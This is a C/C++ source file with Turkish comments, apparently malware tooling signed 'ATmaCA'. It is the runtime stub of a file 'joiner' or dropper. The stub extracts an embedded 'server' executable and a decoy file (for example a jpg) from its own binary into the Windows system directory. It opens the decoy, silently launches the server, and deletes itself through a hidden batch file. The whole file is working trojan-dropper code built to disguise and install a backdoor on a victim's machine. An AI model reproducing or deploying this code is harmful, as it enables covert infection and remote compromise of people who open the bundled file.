
//int join(char uzanti1[4],char uzanti2[4]) seklinde kullanilacak
//Coded By ATmaCA

#include <dos.h>
#include <Shellapi.h>
#include <stdlib.h>
#include <windows.h>
#include "shlwapi.h"
#include "stdio.h"
void Kendini_Sil()
                  {
                    /* 
                    :1
                    del "C:\server.exe"
                    if exist "C:\server.exe" goto 1
                    del %0  */
                    char kendi_ismi[MAX_PATH];
                    char kendi_ismi2[MAX_PATH];
                    char r='"';
                    char k='%';
                    GetModuleFileName( NULL,kendi_ismi, MAX_PATH) ;
                    strcpy(kendi_ismi2,kendi_ismi);
                    FILE *di;
                    if((di=fopen(strcat(kendi_ismi,".bat"),"w")) == NULL)
                       {
                        return;
                       }
                    fprintf(di,":1\n");
                    fprintf(di,"del %c%s%c\n",r,kendi_ismi2,r);
                    fprintf(di,"if exist  %c%s%c goto 1\n",r,kendi_ismi2,r);
                    fprintf(di,"del %c0\n",k);
                    fclose(di);
                    WinExec(kendi_ismi, SW_HIDE);
   	
                  }
char *system1,*system2;
int Adres_Bul(char x1,char x2,char x3,char x4,char x5,char x6,char x7,char x8,char *dosya)
{
FILE *di1;
int adres=0;
//unsigned char kr1[10000000];
int *kr1 = new int[10000000];
char kr2;

//x 8 byte lik hexa imza: ornek: 0x23 0x00 0x25 0x2a 0x24 0x00 0x27 0x30
int i1=0;
if((di1=fopen(dosya,"rb")) == NULL)
{
return -1;
}
  while(!feof(di1))
    {
    kr1[i1]=getc(di1);
    i1++;
    };   rewind(di1);
    i1=0;
    while(!feof(di1))
    {
    kr2=getc(di1);
    if( kr1[i1]==x1 && kr1[i1+1]==x2 && kr1[i1+2]==x3 && kr1[i1+3]==x4 && kr1[i1+4]==x5 && kr1[i1+5]==x6 && kr1[i1+6]==x7 && kr1[i1+7]==x8  )
    {
    adres=i1;  //394 geri
    }
    i1++;
    };
fclose(di1);
//ShowMessage(adres);
return (adres);
}

int join(char uzanti1[4],char uzanti2[4])
{
 //NOT: Exeye yazilirken ilk once server dosyasi sonra diger dosya eklenecek
 //tam bu sekilde olucak joiner"atmaca79"+serveruzantisi+digerdosyauzantisi+server+"fotini78"+digerdosya
 //NOT: uzantilar exe jpg gibi olucak 3 haneli!!!


 int i=0;
 int a_baslangic; //atmaca79
 int b_baslangic; //fotini78
 char kendi_ismi[MAX_PATH];
 unsigned char kr;
 GetModuleFileName( NULL,kendi_ismi, MAX_PATH) ;
 FILE *di,*out1,*out2; //out
 if((di=fopen(kendi_ismi,"rb"))==NULL)
   {
     return -1;
   }
 a_baslangic=Adres_Bul('a','t','m','a','c','a','7','9',kendi_ismi);
 /////////////////////////// 1.uzanti okunuyor
 fseek(di,a_baslangic+8,0);
 uzanti1[0]=getc(di);
 fseek(di,a_baslangic+9,0);
 uzanti1[1]=getc(di);
 fseek(di,a_baslangic+10,0);
 uzanti1[2]=getc(di);
 uzanti1[3]=NULL;
 //////////////////////////// 2.uzanti okunuyor
 fseek(di,a_baslangic+11,0);
 uzanti2[0]=getc(di);
 fseek(di,a_baslangic+12,0);
 uzanti2[1]=getc(di);
 fseek(di,a_baslangic+13,0);
 uzanti2[2]=getc(di);
 uzanti2[3]=NULL;

 char path[100];
 char path1[100];
 char path2[100];
 GetSystemDirectory( path, 100 );
 strcpy(path1,path);
 strcpy(path2,path);

 strcat(path1,"\\win_a32.exe");
 //strcat(path1,uzanti1);
 system1=path1;

 strcat(path2,"\\win_b32.");
 strcat(path2,uzanti2);
 system2=path2;

 //ShowMessage(system1);
 //ShowMessage(system2);
 if((out1=fopen(system1,"wb"))==NULL)  //out1 aciliyor
   {
     return -2;
   }
 fseek(di,a_baslangic+14,0);
 b_baslangic=Adres_Bul('f','o','t','i','n','i','7','8',kendi_ismi);
 //ShowMessage("herseyyolunda1");
 for(i=0;i<(b_baslangic-a_baslangic-14);i++)  //out1 yaziliyor
    {
        kr=getc(di);
        putc(kr,out1);
    }
    fclose(out1);
 fseek(di,b_baslangic+8,0);
 //ShowMessage("herseyyolunda2");
 if((out2=fopen(system2,"wb"))==NULL)  //out1 aciliyor
   {
     return -3;
   }

int g1=0,gx=0; //flash lardaki sorunu halletmek icin for dongusunde kullanmaya karar verdigim degiskenler
char g2; //flash icin
 while(!feof(di))
   {
    g2=getc(di);
    gx++;
   }
   fseek(di,b_baslangic+8,0);
 for(g1=0;g1<gx-2;g1++)
      {
        kr=getc(di);           //out2 yaziliyor
        putc(kr,out2);
      };
       fclose(out2);
  //ShowMessage(system2);

  ShellExecute(0,"open" ,system2,NULL,NULL,SW_SHOW);   //birlestirilen dosya calistiriliyor
  ShellExecute(0,"open" ,system1,NULL,NULL,SW_SHOW);   //server calistiriliyor...
  char kendi_ismi7[MAX_PATH];
  GetModuleFileName( NULL,kendi_ismi7, MAX_PATH) ;
  char sonix[250];
  strcpy(sonix,kendi_ismi7);
  sonix[strlen(sonix)-3]=NULL;
  CopyFile(system2,strcat(sonix,uzanti2),true);
 return 1;
}
























